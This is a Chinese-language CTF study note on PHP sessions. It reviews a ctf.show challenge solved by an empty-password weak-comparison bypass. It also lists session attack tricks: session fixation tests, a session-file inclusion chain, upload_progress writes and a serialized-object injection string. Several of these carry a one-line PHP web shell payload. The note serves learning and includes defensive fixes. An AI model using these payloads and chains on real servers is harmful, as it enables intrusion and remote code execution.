---
title: "PHP $_SESSION 原理与 CTF 技巧"
date: "2026-05-21"
tags: [ctf-web, php, session, weak-comparison, ctfshow]
source: conversation
---

## 问题背景

本笔记来自一次 ctf.show Web 题复盘。题目页面暴露了类似如下 PHP 逻辑：

```php
function replaceSpecialChar($strParam){
    $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
    return preg_replace($regex,"",$strParam);
}

if(strlen($password)!=strlen(replaceSpecialChar($password))){
    die("sql inject error");
}

if($password==$_SESSION['password']){
    echo $flag;
}else{
    echo "error";
}
```

关键现象：

```text
直接无 Cookie 访问 /login.php?password= 可以拿到 flag
先访问首页，再带同一个 PHPSESSID 访问 /login.php?password= 会返回 error
```

这说明漏洞不只是“空密码绕过”，而是和 `$_SESSION` 的初始化状态、访问顺序、Cookie 状态有关。

## `$_SESSION` 基本原理

`$_SESSION` 是 PHP 的服务端会话变量，用来在多次 HTTP 请求之间保存用户状态。

HTTP 本身是无状态协议。服务端默认无法知道两次请求是否来自同一个用户，因此 PHP 使用 session 机制建立关联：

1. 服务端调用 `session_start()`。
2. PHP 检查请求中是否存在 session id，通常是 Cookie 中的 `PHPSESSID`。
3. 如果没有 session id，PHP 生成新的 session id，并通过 `Set-Cookie` 返回给浏览器。
4. 浏览器后续请求自动携带该 Cookie。
5. 服务端根据 session id 找到对应的服务端 session 数据。

典型响应头：

```http
Set-Cookie: PHPSESSID=abc123; path=/
```

后续请求头：

```http
Cookie: PHPSESSID=abc123
```

`PHPSESSID` 本身通常只是索引，真正的数据保存在服务端。例如 Linux 环境中常见路径：

```text
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php/session/sess_<PHPSESSID>
```

一个 session 文件内容可能类似：

```text
username|s:5:"admin";role|s:4:"user";
```

## Session 与 Cookie 的区别

Cookie 在客户端，用户可以直接修改：

```http
Cookie: role=admin
```

如果程序直接信任 Cookie：

```php
if ($_COOKIE['role'] == 'admin') {
    echo $flag;
}
```

则可以直接伪造。

Session 数据主要在服务端，客户端通常只能看到 `PHPSESSID`，理论上更安全。但 CTF 中经常从以下方向考察：

- session 变量是否初始化；
- 是否使用弱比较；
- session id 是否可控；
- session 文件是否可被包含；
- session 序列化处理器是否存在差异；
- `session.upload_progress` 是否可写入 session 文件。

## 本题核心：未初始化 Session + PHP 弱比较

题目中的关键判断：

```php
if($password==$_SESSION['password']){
    echo $flag;
}
```

如果直接访问：

```text
/login.php?password=
```

则：

```php
$password = "";
```

如果此时 `$_SESSION['password']` 尚未初始化，它相当于 `NULL`。在 PHP 弱比较中：

```php
"" == NULL
```

结果为 true。

因此可以绕过判断。

但如果先访问首页，首页可能会初始化：

```php
$_SESSION['password'] = 某个非空值;
```

此时再访问：

```text
/login.php?password=
```

空字符串就无法等于非空 session 值，因此返回 `error`。

## 复现命令

### 直接无 Cookie 请求

```bash
curl -k -i 'https://fb256022-6b05-4000-bfb7-483b0e0f881f.challenge.ctf.show/login.php?password='
```

观察响应中是否包含 flag。

### 先访问首页再带 Cookie 请求

```bash
curl -k -i -c cookie.txt 'https://fb256022-6b05-4000-bfb7-483b0e0f881f.challenge.ctf.show/'
curl -k -i -b cookie.txt 'https://fb256022-6b05-4000-bfb7-483b0e0f881f.challenge.ctf.show/login.php?password='
```

这种情况下可能返回：

```text
error
```

### 指定一个新 PHPSESSID

```bash
curl -k -i -b 'PHPSESSID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' 'https://fb256022-6b05-4000-bfb7-483b0e0f881f.challenge.ctf.show/login.php?password='
```

如果服务端接受这个新 session id，且对应 session 尚未初始化，则可能绕过。

## CTF 中常见 Session 技巧

### 1. 未初始化 Session 变量绕过

典型代码：

```php
session_start();

if ($_GET['token'] == $_SESSION['token']) {
    echo $flag;
}
```

测试 payload：

```text
?token=
?token=0
?token=false
?token[]=1
```

重点看：

- 是否使用 `==`；
- session 变量是否可能未初始化；
- 是否能绕过初始化页面，直接访问判断页面。

### 2. 访问顺序影响 Session 状态

典型结构：

```php
// index.php
session_start();
$_SESSION['code'] = rand(1000, 9999);
```

```php
// check.php
session_start();
if ($_GET['code'] == $_SESSION['code']) {
    echo $flag;
}
```

测试顺序：

```text
直接访问 check.php?code=
先访问 index.php 再访问 check.php?code=
清 Cookie 后访问
换 PHPSESSID 后访问
```

Session 题一定要显式控制 Cookie 状态。

### 3. Session 固定攻击

如果服务端接受攻击者指定的 session id，就可能出现 session fixation。

测试：

```bash
curl -i -b 'PHPSESSID=testtesttest' http://target/
```

观察服务端是否接受该 session id。

安全做法是在登录成功后刷新 session id：

```php
session_regenerate_id(true);
```

### 4. Session 文件包含导致 RCE

典型链：

```text
可控 session 内容 + 本地文件包含 session 文件 = RCE
```

示例：

```php
session_start();
$_SESSION['name'] = $_GET['name'];
include($_GET['file']);
```

攻击思路：

```text
?name=<?php system($_GET[1]);?>
?file=/tmp/sess_<PHPSESSID>&1=id
```

常见 session 文件路径：

```text
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php/session/sess_<PHPSESSID>
C:\Windows\Temp\sess_<PHPSESSID>
```

### 5. `session.upload_progress` 写 Session

PHP 的上传进度机制可能向 session 文件写入内容。

如果配置开启：

```ini
session.upload_progress.enabled = On
```

可以通过 multipart 表单中的字段写入 session：

```http
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system($_GET[1]); ?>
```

常见组合：

```text
session.upload_progress 写入恶意内容
+
LFI 包含 /tmp/sess_<PHPSESSID>
=
RCE
```

这类题经常需要竞争条件，因为上传完成后 upload progress 内容可能被清除。

### 6. Session 反序列化

PHP session 支持不同序列化处理器：

```ini
session.serialize_handler=php
session.serialize_handler=php_binary
session.serialize_handler=php_serialize
```

不同 handler 的格式不同。如果不同页面使用不同 handler，可能造成反序列化注入。

典型利用链：

```text
污染 session 内容
-> 切换 handler 解析
-> 触发 unserialize
-> 调用 __wakeup / __destruct / __toString 等魔术方法
```

常见 payload 形态：

```text
|O:4:"Test":1:{s:3:"cmd";s:2:"id";}
```

是否可利用取决于目标代码中是否存在可触发的 PHP 对象链。

### 7. Session 变量覆盖

危险代码：

```php
foreach ($_GET as $k => $v) {
    $_SESSION[$k] = $v;
}

if ($_SESSION['role'] === 'admin') {
    echo $flag;
}
```

利用：

```text
?role=admin
```

类似危险写法：

```php
$_SESSION = array_merge($_SESSION, $_POST);
```

### 8. `extract($_SESSION)` 变量污染

危险代码：

```php
session_start();
extract($_SESSION);

if ($is_admin) {
    echo $flag;
}
```

如果可以控制：

```php
$_SESSION['is_admin'] = 1;
```

则 `extract($_SESSION)` 后：

```php
$is_admin = 1;
```

进而绕过权限判断。

### 9. Magic Hash 与弱比较

如果 session 中保存的是 hash，且比较使用 `==`，需要注意 magic hash。

例如：

```php
if ($_SESSION['token'] == $_GET['token']) {
    echo $flag;
}
```

PHP 弱比较中，形如：

```text
0e123456789
```

可能被当作科学计数法形式的数字 0。

因此：

```php
"0e12345" == "0e67890"
```

结果可能为 true。

## 通用测试清单

遇到 `$_SESSION` 相关源码时，按这个顺序排查：

```text
1. 是否调用 session_start()
2. session 变量在哪里初始化
3. 是否能绕过初始化页面，直接访问判断页面
4. 是否使用 == 或 != 弱比较
5. 空字符串、0、false、数组、0e 开头字符串是否有效
6. Cookie 状态是否影响结果
7. PHPSESSID 是否可控
8. 是否存在 LFI，可否包含 session 文件
9. 是否能写入 session 内容
10. 是否涉及 session.upload_progress
11. 是否存在 session.serialize_handler 差异
12. 是否存在 extract($_SESSION) 或 session 变量覆盖
```

常用 curl 模板：

```bash
curl -i 'http://target/check.php?password='
curl -i -b 'PHPSESSID=abc123' 'http://target/check.php?password='
curl -i -c cookie.txt 'http://target/'
curl -i -b cookie.txt 'http://target/check.php?password='
```

## 核心结论

Session 题的关键不是只看参数值，还要看服务端 session 状态。

尤其要关注：

```text
访问顺序
Cookie 状态
session 变量是否初始化
弱比较
session 文件是否可控或可包含
```

本题最重要的复盘点是：

```text
直接访问 login.php?password= 成功
先访问首页再访问 login.php?password= 失败
```

这说明在 CTF Web 中，浏览器自动保存 Cookie 可能反而掩盖漏洞。建议使用 curl 或 Burp 明确控制 Cookie。

## 术语中文对照表

| 英文 / 代码术语 | 中文对照 | 简要含义 |
| --- | --- | --- |
| Session | 会话 | 服务端用于识别同一用户连续请求的一组状态数据。 |
| `$_SESSION` | PHP 会话超全局变量 | PHP 中用于读写当前用户 session 数据的数组。 |
| Session ID | 会话标识符 | 用来索引服务端 session 数据的随机字符串。 |
| `PHPSESSID` | PHP 默认会话 Cookie 名 | PHP 默认通过该 Cookie 传递 session id。 |
| Cookie | 浏览器 Cookie | 客户端保存并随请求自动发送给服务端的小型数据。 |
| `Set-Cookie` | 设置 Cookie 响应头 | 服务端要求浏览器保存 Cookie 的 HTTP 响应头。 |
| `session_start()` | 启动会话 | PHP 中加载或创建 session 的函数。 |
| `session.save_path` | 会话保存路径 | PHP 配置项，决定 session 文件保存在哪个目录。 |
| Weak Comparison | 弱比较 | PHP 中使用 `==` 时发生自动类型转换的比较方式。 |
| Strict Comparison | 强比较 | PHP 中使用 `===` 时同时比较类型和值的比较方式。 |
| Session Fixation | 会话固定攻击 | 攻击者预先指定 session id，诱导目标在该 session 中完成登录。 |
| LFI | 本地文件包含 | Local File Inclusion，服务端包含本地文件造成源码读取或代码执行。 |
| RCE | 远程代码执行 | Remote Code Execution，攻击者能让服务端执行任意代码或命令。 |
| Serialization | 序列化 | 将变量、数组、对象转换为可保存字符串的过程。 |
| Deserialization | 反序列化 | 将字符串还原成变量、数组、对象的过程。 |
| Magic Method | 魔术方法 | PHP 中如 `__wakeup`、`__destruct` 等会在特定时机自动调用的方法。 |
| Magic Hash | 魔术哈希 | 形如 `0e...` 的哈希值，弱比较时可能被当作数字 0。 |
| Race Condition | 竞争条件 | 多个操作时序不同导致结果不同，CTF 中常用于抢在清理前利用临时文件或临时状态。 |
| Upload Progress | 上传进度机制 | PHP 可在文件上传过程中把上传状态写入 session。 |
| Burp | Burp Suite | 常用 Web 安全测试代理工具，可拦截、修改、重放 HTTP 请求。 |

## 重点概念详细释义

### `$_SESSION`：服务端状态，不是浏览器里的一坨明文数据

`$_SESSION` 是 PHP 暴露给代码使用的数组接口。开发者看到的是：

```php
$_SESSION['user'] = 'admin';
$_SESSION['is_login'] = true;
```

但浏览器通常不会直接保存这些值。浏览器一般只保存一个 `PHPSESSID`：

```http
Cookie: PHPSESSID=abc123
```

服务端收到这个 id 后，再去服务端存储位置找对应数据。因此可以把它理解为：

```text
浏览器持有：钥匙编号 PHPSESSID
服务端保存：编号对应的柜子内容 $_SESSION
```

CTF 中的关键是：虽然 session 数据在服务端，但 session 的“创建时机、初始化状态、文件路径、序列化格式”都可能成为攻击面。

### `session_start()`：决定什么时候读取或创建 Session

`session_start()` 不是装饰性代码，它真正触发 session 机制：

```php
session_start();
```

它会做三件重要的事：

1. 从 Cookie 或 URL 参数中寻找 session id；
2. 根据 session id 加载已有 session 数据；
3. 如果没有可用 session id，则创建新 session，并可能返回 `Set-Cookie`。

所以如果一个页面没有调用 `session_start()`，即使代码里写了 `$_SESSION`，它也可能无法正确读取之前的会话状态。

CTF 审计时看到 `$_SESSION`，要立刻回头找：

```text
有没有 session_start()
session_start() 在判断之前还是之后
有没有多个文件对同一 session 做不同初始化
```

### `PHPSESSID`：不是权限本身，而是服务端状态的索引

`PHPSESSID` 通常长这样：

```text
PHPSESSID=3db627dfb5819ce261e4c9d81e62430f
```

它不是 `admin=true` 这种直接权限字段，而是服务端 session 数据的索引。服务端可能根据它找到：

```php
$_SESSION['username'] = 'admin';
$_SESSION['role'] = 'user';
$_SESSION['password'] = '123456';
```

所以攻击时不能只问“能不能改 Cookie 变 admin”，还要问：

```text
服务端是否接受我指定的 PHPSESSID
新 PHPSESSID 对应的 session 是否未初始化
已有 PHPSESSID 是否已经被某个页面污染或初始化
能否通过 LFI 包含 sess_<PHPSESSID> 文件
```

### 未初始化 Session 变量：空值绕过的根源

如果代码写成：

```php
if ($_GET['password'] == $_SESSION['password']) {
    echo $flag;
}
```

但 `$_SESSION['password']` 从来没有被设置，那么它的实际值近似于 `NULL`。

当用户传入空参数：

```text
?password=
```

`$_GET['password']` 是空字符串 `""`。PHP 弱比较中：

```php
"" == NULL
```

可能成立。

因此 CTF 中要特别警惕这种结构：

```php
用户输入 == $_SESSION[某个可能未初始化的键]
```

常见测试参数：

```text
?token=
?code=
?password=
```

如果失败，不代表思路错了，要继续测“清 Cookie / 换 Cookie / 不访问首页直接打接口”。

### 访问顺序：Session 题里经常被忽略的变量

同一个漏洞，下面两种访问方式可能结果完全不同：

```text
方式 A：直接访问 /login.php?password=
方式 B：先访问 /index.php，再访问 /login.php?password=
```

原因是 `/index.php` 可能执行了：

```php
$_SESSION['password'] = rand(100000, 999999);
```

这样 session 变量就从“未初始化”变成了“非空值”。于是空字符串不再能绕过。

所以做 session 题时，浏览器反而容易误导你，因为浏览器会自动保留 Cookie。推荐用 curl 或 Burp 显式控制 Cookie。

### 弱比较：PHP 自动类型转换带来的坑

PHP 中：

```php
==
```

是弱比较，会自动转换类型。

例如在某些 PHP 场景下：

```php
"" == NULL
0 == false
"0" == 0
"0e12345" == "0e67890"
```

可能成立。

而：

```php
===
```

是强比较，会同时比较类型和值：

```php
"" === NULL
```

结果为 false。

CTF 中看到以下写法要重点关注：

```php
if ($_GET['x'] == $_SESSION['x'])
if ($_POST['token'] == $real_token)
if (md5($a) == md5($b))
```

优先尝试：

```text
空字符串
0
false
数组参数
0e 开头字符串
```

### Session 文件：从“状态存储”变成“可包含文件”

PHP 默认 session 常以文件形式保存，文件名通常类似：

```text
sess_<PHPSESSID>
```

如果攻击者能控制 session 内容：

```php
$_SESSION['name'] = $_GET['name'];
```

同时存在本地文件包含：

```php
include($_GET['file']);
```

就可以尝试：

```text
写入 PHP 代码到 session
包含 session 文件
执行代码
```

这就是“Session 文件包含导致 RCE”。它的关键条件是：

```text
1. 知道或控制 PHPSESSID
2. 能把恶意内容写入 session
3. 知道或猜到 session 文件路径
4. 存在 LFI 包含点
```

### `session.upload_progress`：没有显式写 Session，也可能能写

有些题里代码没有：

```php
$_SESSION['xxx'] = $_GET['xxx'];
```

但如果 PHP 开启了上传进度功能，上传过程中 PHP 自己会向 session 写入上传状态。

攻击者可以通过 multipart 表单中的字段：

```text
PHP_SESSION_UPLOAD_PROGRESS
```

把内容写进 session 文件，再配合 LFI 尝试包含。

这类题的难点在于：上传结束后进度信息可能被清理，所以常需要竞争条件：

```text
一边持续上传大文件
一边高频但受控地请求 LFI 包含 session 文件
```

注意：实际比赛中应避免对远程题目造成压力，控制请求频率。

### Session 反序列化：格式差异造成对象注入

PHP session 可以用不同格式保存，例如：

```ini
session.serialize_handler=php
session.serialize_handler=php_serialize
```

如果 A 页面用一种格式写，B 页面用另一种格式读，就可能把攻击者构造的字符串解释成对象。

如果项目中存在危险魔术方法：

```php
__wakeup()
__destruct()
__toString()
```

就可能形成：

```text
污染 session -> 反序列化对象 -> 触发魔术方法 -> 文件删除 / 命令执行 / 文件读取
```

这种题的本质不是“session 本身能 RCE”，而是：

```text
session 反序列化提供入口
PHP 对象链提供效果
```

### Session Fixation：提前固定受害者的会话编号

Session Fixation 的中文可以理解为“会话固定”。攻击者先指定一个 session id：

```http
Cookie: PHPSESSID=attack123
```

如果服务端接受这个 id，并且用户登录后服务端没有调用：

```php
session_regenerate_id(true);
```

那么登录态可能仍绑定在 `attack123` 上。攻击者只要继续使用同一个 `PHPSESSID`，就可能复用登录态。

CTF 中常见测试方式：

```bash
curl -i -b 'PHPSESSID=attack123' http://target/
```

观察响应里是否继续接受该 session id，或者是否生成新的 session id。

### Magic Hash：看起来是字符串，弱比较时像数字

Magic Hash 常见形式：

```text
0e462097431906509019562988736854
```

它符合科学计数法外观：

```text
0 × 10^462097...
```

弱比较时可能被 PHP 当成数字 0。

因此：

```php
"0e12345" == "0e67890"
```

可能成立。

它常出现在：

```php
if (md5($input) == $_SESSION['token'])
if (md5($a) == md5($b))
```

正确防御是使用强比较或 `hash_equals()`：

```php
hash_equals($real_hash, $user_hash)
```

## 待验证

- [待验证] 不同 PHP 版本下，未定义 `$_SESSION['password']` 与空字符串弱比较的告警表现可能不同。
- [待验证] 具体 session 文件路径取决于目标服务器的 `session.save_path` 配置。
- [待验证] `session.upload_progress` 是否可用取决于 PHP 配置和上传处理流程。
